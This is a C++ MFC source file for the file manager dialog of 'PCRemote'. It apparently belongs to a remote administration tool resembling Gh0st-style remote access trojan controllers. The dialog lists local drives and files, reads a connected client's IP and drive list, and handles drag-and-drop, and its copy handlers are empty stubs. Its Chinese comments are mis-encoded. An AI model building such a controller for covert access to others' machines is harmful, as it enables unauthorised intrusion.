// FileManagerDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "PCRemote.h"
#include "FileManagerDlg.h"
#include "afxdialogex.h"
#include "FileTransferModeDlg.h"
#include "..\common\macros.h"

// CFileManagerDlg �Ի���

static UINT indicators[] =
{
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,
	ID_SEPARATOR
};

IMPLEMENT_DYNAMIC(CFileManagerDlg, CDialogEx)

CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(CFileManagerDlg::IDD, pParent)
{
	SHFILEINFO sfi;
	SHGetFileInfo
		(
		"\\\\",
		FILE_ATTRIBUTE_NORMAL,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_ICON | SHGFI_USEFILEATTRIBUTES
		);
	m_hIcon = sfi.hIcon;

	HIMAGELIST hImageList;	//����ϵͳͼ���б�
	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_LARGEICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Large = CImageList::FromHandle(hImageList);

	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_SMALLICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Small = CImageList::FromHandle(hImageList);


	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	sockaddr_in sockAddr;
	int nSockAddrLen = sizeof(sockaddr_in);
	memset(&sockAddr, 0, nSockAddrLen);

	//�õ����ӿͻ��˵�IP
	int nResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = (nResult != SOCKET_ERROR) ? inet_ntoa(sockAddr.sin_addr) : "";

	memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
	memcpy(m_bRemoteDriveList, 
		   m_pContext->m_DeCompressionBuffer.GetBuffer(1), 
		   m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);

	m_nTransferMode = TRANSFER_MODE_NORMAL;
	m_nOperatingFileLength = 0;
	m_nCounter = 0;

	m_bIsStop = FALSE;
}

CFileManagerDlg::~CFileManagerDlg()
{
}

void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LOCAL_PATH, m_Local_Directory_ComboBox);
	DDX_Control(pDX, IDC_REMOTE_PATH, m_Remote_Directory_ComboBox);
	DDX_Control(pDX, IDC_LIST_REMOTE, m_list_remote);
	DDX_Control(pDX, IDC_LIST_LOCAL, m_list_local);
}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialogEx)
	ON_WM_SIZE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_LOCAL, &CFileManagerDlg::OnNMDblclkListLocal)
	ON_COMMAND(IDT_REMOTE_COPY, &CFileManagerDlg::OnRemoteCopy)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_COPY, &CFileManagerDlg::OnUpdateRemoteCopy)
	ON_COMMAND(IDT_LOCAL_COPY, &CFileManagerDlg::OnLocalCopy)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_COPY, &CFileManagerDlg::OnUpdateLocalCopy)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_LOCAL, &CFileManagerDlg::OnBegindragListLocal)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_REMOTE, &CFileManagerDlg::OnBegindragListRemote)
	ON_WM_MOUSEMOVE()
	ON_WM_LBUTTONUP()
END_MESSAGE_MAP()


// CFileManagerDlg ��Ϣ�������

int GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes)
{
	SHFILEINFO sfi;
	if(dwFileAttributes == INVALID_FILE_ATTRIBUTES)
		dwFileAttributes = FILE_ATTRIBUTE_NORMAL;
	else
		dwFileAttributes |= FILE_ATTRIBUTE_NORMAL;

	SHGetFileInfo(
		lpFileName,
		dwFileAttributes,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES);

	return sfi.iIcon;
}

BOOL CFileManagerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	SetIcon(m_hIcon, TRUE);
	SetIcon(m_hIcon, FALSE);

	RECT rect;
	GetClientRect(&rect);

	//Ϊ��ʹ�������Ӵ���
	if (!m_wndToolBar_Local.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, ID_LOCAL_TOOLBAR) 
		||!m_wndToolBar_Local.LoadToolBar(IDR_TOOLBAR1))
	{
		TRACE0("Failed to create toolbar");
		return FALSE;
	}
	m_wndToolBar_Local.ModifyStyle(0, TBSTYLE_FLAT);
	m_wndToolBar_Local.LoadTrueColorToolBar(
		24,
		IDB_TOOLBAR_DISABLE,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_DISABLE);
	// ���������ť
	m_wndToolBar_Local.AddDropDownButton(this, IDT_LOCAL_VIEW, IDR_LOCAL_VIEW);


	if (!m_wndToolBar_Remote.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, ID_REMOTE_TOOLBAR) 
		||!m_wndToolBar_Remote.LoadToolBar(IDR_TOOLBAR2))
	{
		TRACE0("Failed to create toolbar");
		return FALSE;
	}
	m_wndToolBar_Remote.ModifyStyle(0, TBSTYLE_FLAT);
	m_wndToolBar_Remote.LoadTrueColorToolBar(
		24,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_DISABLE);
	// ���������ť
	m_wndToolBar_Remote.AddDropDownButton(this, IDT_REMOTE_VIEW, IDR_REMOTE_VIEW);

	//��ʾ������
	m_wndToolBar_Local.MoveWindow(268, 0, rect.right - 268, 48);
	m_wndToolBar_Remote.MoveWindow(268, rect.bottom / 2 - 10, rect.right - 268, 48);

	//���ñ���
	CString str;
	str.Format("\\\\%s - �ļ�����", m_IPAddress);
	SetWindowText(str);

	//Ϊ�б�����ImageList
	m_list_local.SetImageList(m_pImageList_Large, LVSIL_NORMAL);
	m_list_local.SetImageList(m_pImageList_Small, LVSIL_SMALL);

	//��������������״̬��
	if (!m_wndStatusBar.Create(this) || 
		!m_wndStatusBar.SetIndicators(indicators, sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return FALSE;
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 50);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ʾ״̬��

	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl = new CProgressCtrl;
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, rect, &m_wndStatusBar, 1);
	m_ProgressCtrl->SetRange(0, 100);	//���ý�������Χ
	m_ProgressCtrl->SetPos(20);			//���ý�������ǰλ��

	//��ʼ�������������б�����ʾ�����������б�
	FixedLocalDriveList();
	//��ʼ���ͻ����������б�����ʾ�ͻ����������б�
	//FixedRmoteDriveList();

	m_bDragging = FALSE;
	m_nDragIndex = -1;
	m_nDropIndex = -1;

	CoInitialize(NULL);
	SHAutoComplete(GetDlgItem(IDC_LOCAL_PATH)->m_hWnd, SHACF_FILESYSTEM);

	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}


void CFileManagerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: �ڴ˴������Ϣ����������
	if(!m_wndStatusBar.m_hWnd)			//״̬����û����
		return ;

	// ��λ״̬��
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ʾ������
	RECT	rect;
	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl->MoveWindow(&rect);

	GetDlgItem(IDC_LIST_LOCAL)->MoveWindow(0, 36, cx, (cy - 100) / 2);
	GetDlgItem(IDC_LIST_REMOTE)->MoveWindow(0, (cy / 2) + 28, cx, (cy - 100) / 2);
	GetDlgItem(IDC_STATIC_REMOTE)->MoveWindow(20, cy / 2, 25, 20);
	GetDlgItem(IDC_REMOTE_PATH)->MoveWindow(53, (cy / 2) - 4 , 210, 12);


	GetClientRect(&rect);
	//��ʾ������
	m_wndToolBar_Local.MoveWindow(268, 0, rect.right - 268, 48);
	m_wndToolBar_Remote.MoveWindow(268, rect.bottom / 2 - 10, rect.right - 268, 48);
}

void CFileManagerDlg::FixedLocalDriveList()
{
	char szDrive[MAX_PATH] = {0};
	char *pDrive = NULL;
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0));

	//��ʼ���б���Ϣ
	m_list_local.InsertColumn(0, "����", LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "����", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "�ܴ�С", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "���ÿռ�", LVCFMT_LEFT, 115);

	GetLogicalDriveStrings(MAX_PATH, szDrive);
	pDrive = szDrive;

	char szFileSystem[MAX_PATH];
	unsigned __int64 HDTotalSpace = 0;
	unsigned __int64 HDFreeSpace  = 0;
	unsigned long TotalMB = 0; //�ܴ�С
	unsigned long FreeMB  = 0;  //ʣ��ռ�

	for (int i = 0; *pDrive != '\0'; i++, pDrive += lstrlen(pDrive) + 1)
	{
		memset(szFileSystem, 0, sizeof(szFileSystem));
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, szFileSystem, MAX_PATH);
		int nFileSystemLen = lstrlen(szFileSystem) + 1;

		if (GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDTotalSpace, NULL))
		{
			TotalMB = HDTotalSpace / 1024 /1024;
			FreeMB  = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			TotalMB = 0;
			FreeMB  = 0;
		}

		int nItem = m_list_local.InsertItem(i, pDrive, GetIconIndex(pDrive, GetFileAttributes(pDrive)));
		m_list_local.SetItemData(nItem, 1);
		if (lstrlen(szFileSystem) == 0)
		{
			SHFILEINFO sfi;
			SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
			m_list_local.SetItemText(nItem, 1, sfi.szTypeName);
		} 
		else
		{
			m_list_local.SetItemText(nItem, 1, szFileSystem);
		}

		CString str;
		str.Format("%10.1f GB", (float)TotalMB / 1024);
		m_list_local.SetItemText(nItem, 2, str);
		str.Format("%10.1f GB", (float)FreeMB / 1024);
		m_list_local.SetItemText(nItem, 3, str);
	}

	//���ñ��ص�ǰ·��
	m_Local_Path = "";
	m_Local_Directory_ComboBox.ResetContent();
}

void CFileManagerDlg::OnNMDblclkListLocal(NMHDR *pNMHDR, LRESULT *pResult)
{
	//LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	if(m_list_local.GetSelectedCount() == 0 || m_list_local.GetItemData(m_list_local.GetSelectionMark()) != 1)
		return ;
	FixedLocalFileList();
	*pResult = 0;

}

void CFileManagerDlg::FixedLocalFileList(CString directory /* = "" */)
{
	if (directory.GetLength() == 0)
	{
		int nItem = m_list_local.GetSelectionMark();

		if (nItem != -1)
		{
			if (m_list_local.GetItemData(nItem) == 1)	//������ѡ�У�������Ŀǰ
				directory = m_list_local.GetItemText(nItem, 0);
		} 
		else
		{
			m_Local_Directory_ComboBox.GetWindowText(m_Local_Path);
		}
	}

	//��ȡ��Ŀ¼
	if (directory == "..")
	{
		m_Local_Path = GetParentDirectory(m_Local_Path);
	}
	else if (directory != ".")		//����ˢ�µ�ǰĿ¼
	{
		m_Local_Path += directory;
		if(m_Local_Path.Right(1) != "\\")
			m_Local_Path += "\\";
	}

	//if���������ĸ�Ŀ¼�����ش����б�
	if (m_Local_Path.GetLength() == 0)
	{
		FixedLocalDriveList();
		return ;
	}

	m_Local_Directory_ComboBox.InsertString(0, m_Local_Path);
	m_Local_Directory_ComboBox.SetCurSel(0);

	//�ؽ��б���
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0));

	m_list_local.InsertColumn(0, "����", LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "��С", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "����", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "�޸�����", LVCFMT_LEFT, 115);

	int nItemIndex = 0;
	m_list_local.SetItemData(
		m_list_local.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_NORMAL)),
		1);

	//iΪ0ʱ��Ŀ¼��iΪ1ʱ���ļ�
	for (int i = 0; i < 2; i++)
	{
		CFileFind finder;
		BOOL bContinue;
		bContinue = finder.FindFile(m_Local_Path + "*.*");
		while(bContinue)
		{
			bContinue = finder.FindNextFile();
			if(finder.IsDots())
				continue;
			
			BOOL bIsInsert = (!finder.IsDirectory() == i);

			if(!bIsInsert)
				continue;

			int nItem = m_list_local.InsertItem(nItemIndex++, finder.GetFileName(), 
				GetIconIndex(finder.GetFilePath(), GetFileAttributes(finder.GetFilePath())));
			m_list_local.SetItemData(nItem, finder.IsDirectory());
			SHFILEINFO sfi;
			SHGetFileInfo(finder.GetFilePath(), 0, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME);
			m_list_local.SetItemText(nItem, 2, sfi.szTypeName);

			CString str;
			if(i)
			{
				str.Format("%10d KB", finder.GetLength() / 1024 + (finder.GetLength() % 1024 ? 1 : 0));
				m_list_local.SetItemText(nItem, 1, str);
			}
			CTime time;
			finder.GetLastWriteTime(time);
			m_list_local.SetItemText(nItem, 3, time.Format("%Y-%m-%d %H:%M"));

		}
	}
}

CString CFileManagerDlg::GetParentDirectory(CString strPath)
{
	int Index = strPath.ReverseFind('\\');
	if (Index == -1)
	{
		return strPath;
	}
	CString str = strPath.Left(Index);
	Index = str.ReverseFind('\\');
	if (Index == -1)
	{
		strPath = "";
		return strPath;
	}
	strPath = str.Left(Index);

	if(strPath.Right(1) != "\\")
		strPath += "\\";

	return strPath;
}

void CFileManagerDlg::DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList)
{
	if(pDragList == pDropList)
		return ;

	pDropList->SetItemState(m_nDropIndex, 0, LVIS_DROPHILITED);

	if (pDropList == &m_list_local)
	{
		OnRemoteCopy();
	} 
	else if(pDropList == &m_list_remote)
	{
		OnLocalCopy();
	}
	else
	{
		//������
		return ;
	}

	m_nDropIndex = -1;
}

void CFileManagerDlg::OnRemoteCopy()
{
	// TODO: �ڴ���������������
}


void CFileManagerDlg::OnUpdateRemoteCopy(CCmdUI *pCmdUI)
{
	// TODO: �ڴ������������û����洦��������
}


void CFileManagerDlg::OnLocalCopy()
{
	// TODO: �ڴ���������������
}


void CFileManagerDlg::OnUpdateLocalCopy(CCmdUI *pCmdUI)
{
	// TODO: �ڴ������������û����洦��������
}


void CFileManagerDlg::OnBegindragListLocal(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	m_nDragIndex = pNMLV->iItem;

	if(m_list_local.GetItemText(m_nDragIndex, 0) == "..")
		return ;

	if(m_list_local.GetSelectedColumn() > 1)
		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
	else
		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);

	ASSERT(m_hCursor);

	m_bDragging = TRUE;
	m_nDropIndex = -1;
	m_pDragList = &m_list_local;
	m_pDropWnd = &m_list_local;

	//�������е������Ϣ
	SetCapture();
	*pResult = 0;
}


void CFileManagerDlg::OnBegindragListRemote(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	m_nDragIndex = pNMLV->iItem;

	if(m_list_remote.GetItemText(m_nDragIndex, 0) == "..")
		return ;

	if(m_list_remote.GetSelectedColumn() > 1)
		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
	else
		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);

	ASSERT(m_hCursor);

	m_bDragging = TRUE;
	m_nDropIndex = -1;
	m_pDragList = &m_list_remote;
	m_pDropWnd = &m_list_remote;

	//�������е������Ϣ
	SetCapture();
	*pResult = 0;
}


void CFileManagerDlg::OnMouseMove(UINT nFlags, CPoint point)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	if (m_bDragging)
	{
		CPoint pt(point);
		ClientToScreen(&pt);

		//// Get the CWnd pointer of the window that is under the mouse cursor
		CWnd *pDropWnd = WindowFromPoint(pt);
		ASSERT(pDropWnd);

		// If we drag outside current window we need to adjust the highlights displayed
		if (pDropWnd != m_pDropWnd)
		{
			if (m_nDropIndex != -1)//���֮ǰ��һ������DropList�����m_nDropIndex�õ������λ�ù�����λ������ø�����֮������Ƴ�DropList����Ҫ��֮ǰ���õĸ�����ȡ����	
			{
				CListCtrl *pList = (CListCtrl*)m_pDropWnd;
				VERIFY(pList->SetItemState(m_nDropIndex, 0, LVIS_DROPHILITED));
				// redraw item
				VERIFY(pList->RedrawItems(m_nDropIndex, m_nDropIndex));
				pList->UpdateWindow();
				m_nDropIndex = -1;
			}
		}

		// Save current window pointer as the CListCtrl we are dropping onto
		m_pDropWnd = pDropWnd;

		// Convert from screen coordinates to drop target client coordinates
		pDropWnd->ScreenToClient(&pt);

		// if window is CListCtrl
		if (pDropWnd->IsKindOf(RUNTIME_CLASS(CListCtrl)))
		{
			//Note that we can drop here
			SetCursor(m_hCursor);

			if(m_pDropWnd->m_hWnd == m_pDragList->m_hWnd)
				return ;

			UINT uFlags;
			CListCtrl *pList = (CListCtrl*)pDropWnd;

			// Turn off hilight for previous drop target
			pList->SetItemState(m_nDropIndex, 0, LVIS_DROPHILITED);
			// Redraw previous item
			pList->RedrawItems(m_nDropIndex, m_nDropIndex);

			// Get the item that is below cursor
			m_nDropIndex = ((CListCtrl*)pDropWnd)->HitTest(pt, &uFlags);

			if (m_nDropIndex != -1)
			{
				// Highlight it
				pList->SetItemState(m_nDropIndex, LVIS_DROPHILITED, LVIS_DROPHILITED);
				// Redraw item
				pList->RedrawItems(m_nDropIndex, m_nDropIndex);
				pList->UpdateWindow();
			}
		}
		else
		{
			//If we are not hovering over a CListCtrl, change the cursor
			// to note that we cannot drop here
			SetCursor(LoadCursor(NULL, IDC_NO));
		}
	}
	CDialogEx::OnMouseMove(nFlags, point);
}


void CFileManagerDlg::OnLButtonUp(UINT nFlags, CPoint point)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	if (m_bDragging)
	{
		// release mouse capture
		ReleaseCapture();

		m_bDragging = FALSE;

		CPoint pt(point);
		ClientToScreen(&pt);

		CWnd *pDropWnd = WindowFromPoint(pt);
		ASSERT(pDropWnd);

		if (pDropWnd->IsKindOf(RUNTIME_CLASS(CListCtrl)))
		{
			m_pDragList = (CListCtrl *)pDropWnd;
			DropItemOnList(m_pDragList, m_pDropWnd);
		}
	}
	CDialogEx::OnLButtonUp(nFlags, point);
}
